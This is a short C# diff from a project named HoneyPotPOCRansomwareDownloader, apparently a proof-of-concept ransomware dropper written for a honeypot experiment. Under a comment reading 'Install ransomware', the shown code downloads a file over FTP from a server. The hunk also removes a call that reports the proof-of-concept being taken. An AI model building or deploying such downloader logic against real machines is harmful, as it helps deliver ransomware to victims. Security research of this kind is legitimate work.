@@ -26,11 +26,7 @@ namespace HoneyPotPOCRansomwareDownloader
             Console.WriteLine(serverCommunicator.getNAMEONTEST());
             Thread.Sleep(100);
             //Install ransomware
-
-            serverCommunicator.postPoCTaken();
-
-            Thread.Sleep(100);
-
+            
             serverCommunicator.downloadFileFTP();
 
             Thread.Sleep(100);
